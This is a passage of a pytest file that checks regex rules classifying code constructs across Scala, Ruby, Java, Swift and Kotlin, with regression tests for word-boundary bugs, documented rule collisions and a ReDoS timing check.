    ("time_date_logic", "FiniteDuration(5, SECONDS)", None),
    ("ipc_rpc_bridges", "val sys = ActorSystem()", None),
]


@pytest.mark.parametrize("signature,positive,negative", _SCALA_SIMPLE_CASES)
def test_scala_signature_positive_and_negative(signature, positive, negative):
    pattern = SCALA_RULES[signature]
    assert pattern is not None, f"scala's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"scala {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"scala {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_scala_ownership_scaladoc_author_no_colon_regression():
    """
    Regression test: the Scaladoc `@author` tag was grouped with
    `Created by`/`Maintainer`/`Copyright`, all of which require a literal
    `:` -- but Scaladoc's actual convention (matching Javadoc, and java's
    own ownership rule) is `@author Jane Doe`, with no colon. The colon
    requirement meant the real tag never matched.
    """
    pattern = SCALA_RULES["ownership"]
    assert pattern.search("@author Jane Doe"), "the real, colon-less @author form still didn't match"
    assert pattern.search("Created by: Jane Doe")
    assert pattern.search("Copyright: 2026 Acme")


def test_scala_test_signature_boundary_regression():
    """Regression test: `test\\s*\\(` ends on `(`, so the shared trailing \\b never fired."""
    pattern = SCALA_RULES["test"]
    assert pattern.search('test("should work") { }'), "test(...) still didn't match"
    assert pattern.search("assertThrows[Exception] { }")


def test_scala_ssr_boundaries_play_result_boundary_regression():
    """
    Regression test: `Ok\\(`/`BadRequest\\(` both end on `(`, so the
    shared trailing \\b never fired for Play's two most common Result
    constructors.
    """
    pattern = SCALA_RULES["ssr_boundaries"]
    assert pattern.search('Ok("success")'), "Ok(...) still didn't match"
    assert pattern.search('BadRequest("error")')
    assert pattern.search("class MyController extends Controller {")


def test_scala_pointers_ptr_bracket_boundary_regression():
    """
    Regression test: `Ptr\\[[^\\]]+\\]` ends on the closing `]`, so the
    shared trailing \\b never fired (unlike `decode\\[` elsewhere, which
    is bounded only by the opening `[` and always followed by a word-char
    type name).
    """
    pattern = SCALA_RULES["pointers"]
    assert pattern.search("val p: Ptr[Int] = ???"), "Ptr[Int] still didn't match"
    assert pattern.search("ptr.isEmpty")


def test_scala_memory_alloc_zone_and_alloc_boundary_regression():
    """
    Regression test: `zone[ \\t]*\\{` ends on `{` and `alloc\\[[^\\]]+\\]`
    ends on the closing `]` -- both non-word, so the shared trailing \\b
    never fired for either.
    """
    pattern = SCALA_RULES["memory_alloc"]
    assert pattern.search("zone { implicit z => foo() }"), "zone { ... } still didn't match"
    assert pattern.search("val buf = alloc[Byte](10)"), "alloc[...] still didn't match"
    assert pattern.search("Zone.apply { }")


def test_scala_listeners_on_call_boundary_regression():
    pattern = SCALA_RULES["listeners"]
    assert pattern.search("emitter.on('data', cb)"), "on(...) still didn't match its most common form"
    assert pattern.search("stream.subscribe(observer)")


def test_scala_time_date_and_ipc_empty_args_boundary_regression():
    """
    Regression test: `Duration\\s*\\(` and `Process\\s*\\(` both end on
    `(`, so the shared trailing \\b only fired when a word char (e.g. a
    digit argument) immediately followed -- never true for the
    zero/quoted-argument forms (`Duration()`, `Process("cmd")`).
    """
    time_pattern = SCALA_RULES["time_date_logic"]
    ipc_pattern = SCALA_RULES["ipc_rpc_bridges"]
    assert time_pattern.search("val d = Duration()"), "Duration() still didn't match"
    assert time_pattern.search("val d = Duration(5, SECONDS)")
    assert ipc_pattern.search('val p = Process("ls")'), 'Process("cmd") still didn\'t match'
    assert ipc_pattern.search("val sys = ActorSystem()")


def test_scala_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 3 pairs the automated ambiguity sweep flagged for sharing
    literals: class_start<->dead_code ("class"/"object"/"trait"),
    class_start<->func_start ("final"/"open"/"transparent" modifiers),
    dead_code<->import ("import"). All confirmed false positives:
    dead_code's `//` comment-prefix requirement disambiguates it from
    both class_start and import, and class_start/func_start's shared
    modifiers correctly co-firing as mutually exclusive on the SAME
    declaration (one anchors a class, the other a def) is intentional,
    not a collision.

    Also documents a raw-regex-level collision the sweep didn't flag:
    `import`'s pattern has no comment-prefix exclusion, so
    `// import scala.util.Try` matches both `dead_code` AND `import` at
    the raw-regex level. This is expected and harmless in practice --
    comment text is stripped from the code stream by prism.py's
    lexical-family-based comment stripper before `import` ever
    evaluates it in the real pipeline (the same shape as ruby's
    doc-vs-panics_and_aborts YARD-tag collision, documented there too).
    """
    class_start = SCALA_RULES["class_start"]
    dead_code = SCALA_RULES["dead_code"]
    func_start = SCALA_RULES["func_start"]
    import_pattern = SCALA_RULES["import"]

    live_class = "class Foo {"
    assert class_start.search(live_class)
    assert not dead_code.search(live_class)

    commented_class = "// class Foo {"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    final_class = "final class Foo {"
    assert class_start.search(final_class) and not func_start.search(final_class)
    final_def = "final def foo() = {}"
    assert func_start.search(final_def) and not class_start.search(final_def)

    live_import = "import scala.util.Try"
    assert import_pattern.search(live_import)
    assert not dead_code.search(live_import)

    commented_import = "// import scala.util.Try"
    assert dead_code.search(commented_import) and import_pattern.search(commented_import), (
        "documented raw-regex collision changed shape -- update this test's rationale"
    )


def test_scala_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): scala's explicit_casts
    (`asInstanceOf[...]`/`.toInt`/etc.) and pointers (`Ptr[...]`/
    `scala.scalanative.unsafe`) don't share tokens and fire independently.
    """
    casts = SCALA_RULES["explicit_casts"]
    pointers = SCALA_RULES["pointers"]
    assert casts.search("x.toInt")
    assert not casts.search("val p: Ptr[Int] = ???"), "explicit_casts incorrectly matched a Scala Native pointer type"
    assert pointers.search("val p: Ptr[Int] = ???")
    assert not pointers.search("x.toInt"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# RUBY: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #607)
# ==============================================================================
RUBY_RULES = LANGUAGE_DEFINITIONS["ruby"]["rules"]

_RUBY_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if x then", None),
    ("args", "def foo(x, y)", None),
    ("structural_boundaries", "require 'json'", None),
    ("func_start", "def foo", None),
    ("class_start", "class Foo", None),
    ("safety", "rescue => e", None),
    ("safety_bypasses", "eval(code)", None),
    ("high_risk_execution", 'exec("ls")', None),
    ("io", 'File.read("x")', None),
    ("api", "module_function", None),
    ("state_mutation", "arr.push(1)", None),
    ("dead_code", "# def foo", "# just a note"),
    ("doc", "# @param x [String] description", None),
    ("test", "describe 'Foo' do", None),
    ("concurrency", "Thread.new { }", None),
    ("ui_framework", "render :index", None),
    ("closures", "arr.each { |x| x }", None),
    ("globals", "ENV['PATH']", None),
    ("decorators", "validates :name, presence: true", None),
    ("generics", "Array[Integer]", None),
    ("comprehensions", "arr.map { |x| x * 2 }", None),
    ("scientific", "Math.sqrt(4)", None),
    ("reflection_metaprogramming", "define_method(:foo) { }", None),
    ("import", "require 'json'", None),
    ("ownership", "# Author: Jane Doe", None),
    ("planned_debt", "# TODO: refactor", None),
    ("fragile_debt", "# HACK: workaround", None),
    ("spec_exposure", "# [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "respond_to do |format|", None),
    ("events", "broadcast(:event, data)", None),
    ("dependency_injection", "include Import[:foo]", None),
    ("macros", "attr_accessor :name", None),
    ("pointers", "FFI::Pointer.new(:int)", None),
    ("memory_alloc", "GC.start", None),
    ("telemetry", "Rails.logger.info('msg')", None),
    ("debug_prints", "puts 'debug'", None),
    ("explicit_casts", "Integer(x)", None),
    ("panics_and_aborts", "raise 'error'", None),
    ("thread_sleeps", "sleep 5", None),
    ("bitwise_ops", "a ^ b", None),
    ("sync_locks", "Mutex.new", None),
    ("immutability_locks", "freeze", None),
    ("cleanup", "conn.close()", None),
    ("encapsulation", "private", None),
    ("listeners", "bus.subscribe(topic)", None),
    ("test_skip", "skip 'reason'", None),
    ("serialization_parsing", "JSON.parse(str)", None),
    ("regex_execution", "Regexp.new(pattern)", None),
    ("time_date_logic", "Time.now", None),
    ("ipc_rpc_bridges", "Open3.capture3('ls')", None),
]


@pytest.mark.parametrize("signature,positive,negative", _RUBY_SIMPLE_CASES)
def test_ruby_signature_positive_and_negative(signature, positive, negative):
    pattern = RUBY_RULES[signature]
    assert pattern is not None, f"ruby's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"ruby {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"ruby {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_ruby_closures_leading_boundary_regression():
    """
    Regression test: all 4 alternatives shared one leading \\b, but the
    brace-block (`{ |x| ... }`) and stabby-lambda (`->(x) { ... }`) forms
    both start with a non-word character (`{`/`-`) -- the shared leading
    \\b could only fire when a word char immediately preceded them, never
    true for how these are actually written. Only the `do`-based forms
    ever matched; two of Ruby's most common closure forms never did.
    """
    pattern = RUBY_RULES["closures"]
    assert pattern.search("x = ->(n) { n * 2 }"), "the stabby lambda form still didn't match"
    assert pattern.search("x = -> (n) { n * 2 }")
    assert pattern.search("arr.map { |x| x }"), "the brace-block form still didn't match"
    assert pattern.search("arr.each do |x|")
    assert pattern.search("loop do")
    assert not pattern.search("x = { a: 1, b: 2 }"), "closures incorrectly matched a plain hash literal"


def test_ruby_state_mutation_bang_methods_boundary_regression():
    """
    Regression test: the 6 bang-method alternatives (`merge!`, `update!`,
    `gsub!`, `map!`, `select!`, `reject!`) all end on `!` (non-word), so
    the shared trailing \\b could never fire. None of Ruby's canonical
    in-place-mutation methods ever matched.
    """
    pattern = RUBY_RULES["state_mutation"]
    assert pattern.search("hash.merge!(other)")
    assert pattern.search("h.update!(k: v)")
    assert pattern.search('str.gsub!(/a/, "b")')
    assert pattern.search("arr.map! { |x| x * 2 }")
    assert pattern.search("arr.select! { |x| x > 0 }")
    assert pattern.search("arr.reject! { |x| x < 0 }")


def test_ruby_panics_and_aborts_exit_bang_boundary_regression():
    """
    Regression test: `exit!` ends on `!` (non-word), so the shared
    trailing \\b could never fire. Unlike high_risk_execution's copy of
    this same alternative (harmlessly masked by its own bare `exit`
    alternative), panics_and_aborts has no bare `exit` to save it.
    """
    pattern = RUBY_RULES["panics_and_aborts"]
    assert pattern.search("exit! unless ok"), "exit! still didn't match"
    assert pattern.search("raise ArgumentError")


def test_ruby_reflection_respond_to_missing_boundary_regression():
    pattern = RUBY_RULES["reflection_metaprogramming"]
    assert pattern.search("def respond_to_missing?(name, priv)"), "respond_to_missing? still didn't match"
    assert pattern.search("def method_missing(name, *args)")


def test_ruby_ipc_rpc_bridges_boundary_regression():
    """
    Regression test: `system\\s*\\(` ends on `(` and `%x\\{` both starts
    and ends on non-word characters (`%`/`{`) -- the shared \\b boundaries
    could never fire for either. Neither ever matched.
    """
    pattern = RUBY_RULES["ipc_rpc_bridges"]
    assert pattern.search('system("ls")'), "system(...) still didn't match"
    assert pattern.search("%x{ls -la}"), "%x{...} still didn't match"
    assert pattern.search('Open3.capture3("ls")')


def test_ruby_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for ruby:
    class_start<->dead_code and dead_code<->generics (sharing "class"),
    class_start<->generics (sharing "class"). All confirmed non-bugs:
    dead_code's `#` comment-prefix requirement disambiguates it from
    class_start, and generics's "class" hit is actually the distinct,
    capitalized Sorbet type `Class[...]` (case-sensitive, no re.I flag),
    which never collides with the lowercase `class` keyword in practice.

    Also documents a raw-regex-level collision the sweep didn't flag but
    was found during manual review: `doc`'s YARD `@raise` tag and
    `panics_and_aborts`'s bare `raise` both match the same comment line
    (`# @raise [ArgumentError] if invalid`), since "raise" is a literal
    substring of "@raise". This is expected and harmless in practice --
    comment text is stripped from the code stream by prism.py's
    lexical-family-based comment stripper before any signature other
    than dead_code/doc/ownership/planned_debt/fragile_debt ever sees it,
    so panics_and_aborts never actually evaluates raw comment text in the
    real pipeline. Not fixed, since narrowing panics_and_aborts to avoid
    this one YARD tag would be over-fitting a non-representative case.
    """
    class_start = RUBY_RULES["class_start"]
    dead_code = RUBY_RULES["dead_code"]
    generics = RUBY_RULES["generics"]
    doc = RUBY_RULES["doc"]
    panics = RUBY_RULES["panics_and_aborts"]

    live_class = "class Foo"
    assert class_start.search(live_class)
    assert not dead_code.search(live_class)

    commented_class = "# class Foo"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    sorbet_class_type = "sig { params(x: Class[Foo]).void }"
    assert generics.search(sorbet_class_type)
    assert not class_start.search(sorbet_class_type)
    assert not dead_code.search(sorbet_class_type)

    yard_raise = "# @raise [ArgumentError] if invalid"
    assert doc.search(yard_raise) and panics.search(yard_raise), (
        "documented raw-regex collision changed shape -- update this test's rationale"
    )


def test_ruby_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): ruby's explicit_casts
    (`Integer(x)`/`String(x)`/etc.) and pointers (`FFI::Pointer`/
    `Fiddle::Pointer`) don't share tokens and fire independently.
    """
    casts = RUBY_RULES["explicit_casts"]
    pointers = RUBY_RULES["pointers"]
    assert casts.search("Integer(x)")
    assert not casts.search("FFI::Pointer.new(:int)"), "explicit_casts incorrectly matched an FFI pointer type"
    assert pointers.search("FFI::Pointer.new(:int)")
    assert not pointers.search("Integer(x)"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# JAVA: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #588)
# ==============================================================================
JAVA_RULES = LANGUAGE_DEFINITIONS["java"]["rules"]

_JAVA_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { return; }", None),
    ("args", "public void foo(int x) {", None),
    ("structural_boundaries", "import java.util.List;", None),
    ("func_start", "public void foo() {", None),
    ("class_start", "public class Foo {", None),
    ("safety", "try { risky(); } catch (Exception e) {}", None),
    ("safety_bypasses", "Object x = null;", None),
    ("high_risk_execution", "System.exit(1);", None),
    ("io", "File f = new File(path);", None),
    ("api", "public void foo() {}", None),
    ("state_mutation", "this.count = 5;", None),
    ("dead_code", "// public void foo() {}", "// just a note"),
    ("doc", "/** A doc comment */", None),
    ("test", "@Test\npublic void testFoo() {}", None),
    ("concurrency", "Thread t = new Thread(runnable);", None),
    ("ui_framework", "JFrame frame = new JFrame();", None),
    ("closures", "list.forEach(x -> print(x));", None),
    ("globals", 'public static final String FOO = "bar";', None),
    ("decorators", "@Override", None),
    ("generics", "List<String> names;", None),
    ("comprehensions", "list.stream().map(x -> x);", None),
    ("scientific", "Math.sqrt(4);", None),
    ("reflection_metaprogramming", 'Class.forName("Foo");', None),
    ("import", "import java.util.List;", None),
    ("ownership", "@author Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "ModelAndView mav = new ModelAndView();", None),
    ("events", "ApplicationEvent event = new FooEvent();", None),
    ("dependency_injection", "@Autowired\nprivate Foo foo;", None),
    ("pointers", "MemorySegment segment = arena.allocate(8);", None),
    ("memory_alloc", "Arena arena = Arena.ofConfined();", None),
    ("telemetry", 'logger.info("message");', None),
    ("debug_prints", 'System.out.println("debug");', None),
    ("explicit_casts", "(String) obj", None),
    ("panics_and_aborts", 'throw new RuntimeException("err");', None),
    ("thread_sleeps", "Thread.sleep(1000);", None),
    ("bitwise_ops", "a << 2", None),
    ("sync_locks", "synchronized (lock) { }", None),
    ("immutability_locks", "final int x = 5;", None),
    ("cleanup", "conn.close();", None),
    ("encapsulation", "private int x;", None),
    ("listeners", "button.addEventListener(handler);", None),
    ("test_skip", "@Disabled", None),
    ("serialization_parsing", "ObjectMapper mapper = new ObjectMapper();", None),
    ("regex_execution", "Pattern.compile(regex);", None),
    ("time_date_logic", "LocalDate.now();", None),
    ("ipc_rpc_bridges", "ProcessBuilder pb = new ProcessBuilder();", None),
]


@pytest.mark.parametrize("signature,positive,negative", _JAVA_SIMPLE_CASES)
def test_java_signature_positive_and_negative(signature, positive, negative):
    pattern = JAVA_RULES[signature]
    assert pattern is not None, f"java's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"java {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"java {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_java_globals_public_static_final_boundary_regression():
    """
    Regression test: the `public static final ... =` alternative ends on
    `=` (non-word), so the shared trailing \\b could never fire --
    whatever follows the `=` in a real declaration is never a word
    character. This extremely common Java constant-declaration idiom
    never matched at all.
    """
    pattern = JAVA_RULES["globals"]
    assert pattern.search('public static final String FOO = "bar";'), (
        "public static final CONSTANT = value still didn't match"
    )
    assert pattern.search("public static int COUNT = 0;")
    assert pattern.search('System.getenv("HOME")')
    assert not pattern.search("private int x = 5;"), "globals incorrectly matched a private field"


def test_java_state_mutation_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the unanchored
    `(?:\\w+\\.)?` before the method-name keywords greedily consumed a
    long run of plain word characters, failed to find the `.`, and
    backtracked one character at a time -- O(n) work at each of the O(n)
    positions re.search retries this unanchored alternative at. Confirmed
    genuine scaling (0.045s/0.18s/0.71s/2.85s/11.2s at n=5k/10k/20k/40k/
    80k, ~4x per doubling) before being bounded to `\\w{0,100}`.
    """
    pattern = JAVA_RULES["state_mutation"]
    poison = "x" * 80000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    # Correctness must survive the bound.
    assert pattern.search("obj.setValue(x);")
    assert pattern.search("list.add(item);")
    assert pattern.search("map.computeIfAbsent(k, f);")
    assert pattern.search("this.count = 5;")


def test_java_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 5 pairs/collisions the automated ambiguity sweep flagged:
    args<->dead_code ("private"/"protected"/"public"), class_start<->
    dead_code ("class"), class_start<->func_start ("class"/"enum"/
    "interface"/"record"), dead_code<->func_start ("class"/"for"/"if"/
    "return"/"while"), ssr_boundaries<->ui_framework ("ModelAndView").
    All confirmed non-bugs: dead_code's `//` prefix disambiguates it from
    args/class_start/func_start, and ModelAndView is genuinely dual-
    classified (it's both an SSR view-model construct and a UI-adjacent
    MVC class in this schema) -- intentional, not a false collision.
    """
    args = JAVA_RULES["args"]
    dead_code = JAVA_RULES["dead_code"]
    class_start = JAVA_RULES["class_start"]
    func_start = JAVA_RULES["func_start"]
    ssr_boundaries = JAVA_RULES["ssr_boundaries"]
    ui_framework = JAVA_RULES["ui_framework"]

    live_method = "public void foo() {"
    assert args.search(live_method)
    assert not dead_code.search(live_method)

    commented_method = "// public void foo() {"
    assert dead_code.search(commented_method)
    assert not args.search(commented_method)

    live_class = "public class Foo {"
    assert class_start.search(live_class)
    assert not dead_code.search(live_class)
    assert not func_start.search(live_class), "func_start incorrectly matched a class declaration"

    commented_class = "// public class Foo {"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    mav = 'ModelAndView mav = new ModelAndView("view");'
    assert ssr_boundaries.search(mav) and ui_framework.search(mav)


def test_java_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): java's explicit_casts
    (`(String) obj`) and pointers (`MemorySegment`/`MemoryLayout`) don't
    share tokens and fire independently.
    """
    casts = JAVA_RULES["explicit_casts"]
    pointers = JAVA_RULES["pointers"]
    assert casts.search("(String) obj")
    assert not casts.search("MemorySegment segment = arena.allocate(8);"), (
        "explicit_casts incorrectly matched a MemorySegment declaration"
    )
    assert pointers.search("MemorySegment segment = arena.allocate(8);")
    assert not pointers.search("(String) obj"), "pointers incorrectly matched an explicit cast"


def test_java_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with its test-framework `.test(`):
    java's `test` signature only matches `@Test`-style annotations,
    `assert*(`, or `verify`/`expect`/`given`/`when` calls -- never a
    bare `.test(`-style method, so it doesn't collide with
    `regex_execution`'s `Pattern.compile`/`Matcher.find`/`.matches(`.
    """
    test_pattern = JAVA_RULES["test"]
    regex_pattern = JAVA_RULES["regex_execution"]
    assert regex_pattern.search("str.matches(regex)")
    assert not test_pattern.search("str.matches(regex)"), "test incorrectly matched a regex method call"


# ==============================================================================
# SWIFT: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #613)
# ==============================================================================
SWIFT_RULES = LANGUAGE_DEFINITIONS["swift"]["rules"]

_SWIFT_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if x { return }", None),
    ("args", "func foo(x: Int) {", None),
    ("structural_boundaries", "var x = 5", None),
    ("func_start", "func foo() {", None),
    ("class_start", "class Foo {", None),
    ("safety", "guard let x = value else { return }", None),
    ("safety_bypasses", "unowned let delegate = self", None),
    ("high_risk_execution", 'fatalError("unreachable")', None),
    ("io", "let fm = FileManager.default", None),
    ("api", "public func foo() {}", None),
    ("state_mutation", "var count = 0", None),
    ("dead_code", "// func foo() {}", "// just a note"),
    ("doc", "/// A doc comment", None),
    ("test", "XCTAssertEqual(a, b)", None),
    ("concurrency", "Task { await foo() }", None),
    ("ui_framework", "struct ContentView: View {", None),
    ("closures", "{ result in print(result) }", None),
    ("globals", "UserDefaults.standard", None),
    ("decorators", "@available(iOS 15, *)", None),
    ("generics", "func foo<T: Equatable>(x: T) {}", None),
    ("comprehensions", "arr.map { $0 * 2 }", None),
    ("scientific", "let x = sqrt(4.0)", None),
    ("reflection_metaprogramming", "let m = Mirror(reflecting: obj)", None),
    ("import", "import Foundation", None),
    ("ownership", "// Created by: Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", 'app.get("/") { req in }', None),
    ("events", "NotificationCenter.default.post(name: .foo, object: nil)", None),
    ("dependency_injection", "@Environment(\\.foo) var foo", None),
    ("macros", "#Preview {", None),
    ("pointers", "let p: UnsafeMutablePointer<Int>", None),
    ("memory_alloc", "ptr.deallocate()", None),
    ("telemetry", 'Logger().info("message")', None),
    ("debug_prints", 'print("debug")', None),
    ("explicit_casts", "value as? String", None),
    ("panics_and_aborts", 'fatalError("err")', None),
    ("thread_sleeps", "sleep(1)", None),
    ("bitwise_ops", "a << 2", None),
    ("sync_locks", "let lock = NSLock()", None),
    ("immutability_locks", "let x = 5", None),
    ("cleanup", "conn.close()", None),
    ("encapsulation", "private var x = 5", None),
    ("listeners", "view.onAppear(perform: { })", None),
    ("test_skip", "XCTSkip", None),
    ("serialization_parsing", "JSONDecoder().decode(Foo.self, from: data)", None),
    ("regex_execution", "let re = try Regex(pattern)", None),
    ("time_date_logic", "let d = Date()", None),
    ("ipc_rpc_bridges", "URLSession.shared.dataTask(with: url)", None),
]


@pytest.mark.parametrize("signature,positive,negative", _SWIFT_SIMPLE_CASES)
def test_swift_signature_positive_and_negative(signature, positive, negative):
    pattern = SWIFT_RULES[signature]
    assert pattern is not None, f"swift's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"swift {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"swift {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_swift_safety_try_and_as_optional_boundary_regression():
    """
    Regression test: `try\\?`/`as\\?` both end on `?` (non-word), so the
    shared trailing \\b could never fire -- whatever follows these
    operators (a space, then the expression) is never a word character.
    Neither of Swift's two most common error-softening operators ever
    matched.
    """
    pattern = SWIFT_RULES["safety"]
    assert pattern.search("let x = try? foo()"), "try? still didn't match"
    assert pattern.search("let y = value as? String"), "as? still didn't match"
    assert pattern.search("guard let x = value else { return }")


def test_swift_io_data_and_write_boundary_regression():
    """
    Regression test: `Data\\(contentsOf:`/`write\\(to:` both end on `:`
    (non-word), so the shared trailing \\b could never fire. Neither ever
    matched.
    """
    pattern = SWIFT_RULES["io"]
    assert pattern.search("let d = Data(contentsOf: url)"), "Data(contentsOf: still didn't match"
    assert pattern.search("try data.write(to: fileURL)"), "write(to: still didn't match"
    assert pattern.search("let fm = FileManager.default")


def test_swift_test_skip_empty_args_boundary_regression():
    """
    Regression test: `mock\\(`/`stub\\(`/`fake\\(`/`double\\(` all end on
    `(`, so the shared trailing \\b only fired when a word char
    immediately followed the paren -- true for most single-argument
    calls, but never for the zero-argument form (`double()`).
    """
    pattern = SWIFT_RULES["test_skip"]
    assert pattern.search("double()"), "the zero-argument double() form still didn't match"
    assert pattern.search("mock(FooService.self)")
    assert pattern.search("XCTSkip")


def test_swift_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 5 pairs/collisions the automated ambiguity sweep flagged:
    api<->class_start ("open"/"package"/"public"), class_start<->
    dead_code ("actor"/"class"/"extension"/"struct"), events<->
    ipc_rpc_bridges ("NotificationCenter"), io<->ipc_rpc_bridges
    ("URLSession"), macros<->telemetry ("error"/"warning"). All confirmed
    non-bugs: api/class_start correctly co-firing as BOTH true on the
    same `public class Foo {` line is intentional (public is a visibility
    marker, class Foo is a declaration -- not a collision); dead_code's
    `//` prefix disambiguates it from class_start; NotificationCenter and
    URLSession are genuinely dual-classified (a pub/sub bridge is also an
    IPC-like mechanism, and a network client is also treated as an IPC
    bridge in this schema) -- intentional, not a false collision; and
    macros's `#error`/`#warning` (compile-time directives) never collide
    with telemetry's `.error`/`.warning` (log-level method calls) since
    they're structurally distinct tokens, confirmed empirically.
    """
    api = SWIFT_RULES["api"]
    class_start = SWIFT_RULES["class_start"]
    dead_code = SWIFT_RULES["dead_code"]
    events = SWIFT_RULES["events"]
    ipc = SWIFT_RULES["ipc_rpc_bridges"]
    io = SWIFT_RULES["io"]
    macros = SWIFT_RULES["macros"]
    telemetry = SWIFT_RULES["telemetry"]

    live_class = "public class Foo {"
    assert api.search(live_class) and class_start.search(live_class), (
        "both api and class_start should legitimately match the same public class declaration"
    )

    commented_class = "// class Foo {"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    nc = "NotificationCenter.default.post(name: .foo, object: nil)"
    assert events.search(nc) and ipc.search(nc)

    us = "URLSession.shared.dataTask(with: url)"
    assert io.search(us) and ipc.search(us)

    assert macros.search('#error("compile time error")')
    assert not telemetry.search('#error("compile time error")')
    assert telemetry.search('logger.error("runtime error")')
    assert not macros.search('logger.error("runtime error")')


def test_swift_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with its test-framework `.test(`):
    swift's `test` signature only matches XCTest barewords/`@Test`/
    `#expect`/`#require`, never a `.range(of:...)` regex method call, so
    it doesn't collide with `regex_execution`.
    """
    test_pattern = SWIFT_RULES["test"]
    regex_pattern = SWIFT_RULES["regex_execution"]
    snippet = "s.range(of: pattern, options: .regularExpression)"
    assert regex_pattern.search(snippet)
    assert not test_pattern.search(snippet), "test incorrectly matched a regex method call"


def test_swift_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): swift's explicit_casts
    (`as? Type`/`Int(...)`/etc.) and pointers (`UnsafeMutablePointer<T>`/
    `.pointee`) don't share tokens and fire independently.
    """
    casts = SWIFT_RULES["explicit_casts"]
    pointers = SWIFT_RULES["pointers"]
    assert casts.search("let x = value as? String")
    assert not casts.search("UnsafeMutablePointer<Int>"), "explicit_casts incorrectly matched an unsafe pointer type"
    assert pointers.search("UnsafeMutablePointer<Int>")
    assert not pointers.search("let x = value as? String"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# KOTLIN: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #592)
# ==============================================================================
KOTLIN_RULES = LANGUAGE_DEFINITIONS["kotlin"]["rules"]

_KOTLIN_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { return }", None),
    ("args", "fun foo(x: Int) {", None),
    ("func_start", "fun foo() {", None),
    ("class_start", "class Foo {", None),
    ("safety", "val x = require(x > 0)", None),
    ("safety_bypasses", "val x = value!!", None),
    ("high_risk_execution", "exitProcess(1)", None),
    ("io", "val f = File(path)", None),
    ("api", "public fun foo() {}", None),
    ("state_mutation", "var count = 0", None),
    ("dead_code", "// fun foo() {}", None),
    ("doc", "/** A doc comment */", None),
    ("test", "assertEquals(a, b)", None),
    ("concurrency", "launch { compute() }", None),
    ("ui_framework", "@Composable\nfun Foo() {}", None),
    ("closures", "{ x -> x * 2 }", None),
    ("globals", "companion object", None),
    ("decorators", "@JvmStatic", None),
    ("generics", "fun <T> foo(x: T) {}", None),
    ("comprehensions", "list.map { it * 2 }", None),
    ("scientific", "kotlin.math.sqrt(4.0)", None),
    ("reflection_metaprogramming", "Foo::class", None),
    ("import", "import kotlin.collections.List", None),
    ("ownership", "@author Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "call.respond(HttpStatusCode.OK)", None),
    ("events", "flow.collect { value -> use(value) }", None),
    ("dependency_injection", "@Inject\nlateinit var foo: Foo", None),
    ("macros", '@Suppress("unused")', None),
    ("pointers", "val p: CPointer<IntVar>", None),
    ("memory_alloc", "memScoped { }", None),
    ("telemetry", 'Log.i("tag", "message")', None),
    ("debug_prints", 'println("debug")', None),
    ("explicit_casts", "x as String", None),
    ("panics_and_aborts", 'throw RuntimeException("err")', None),
    ("thread_sleeps", "delay(1000)", None),
    ("bitwise_ops", "a xor b", None),
    ("sync_locks", "val mutex = Mutex()", None),
    ("immutability_locks", "val x = 5", None),
    ("cleanup", "conn.close()", None),
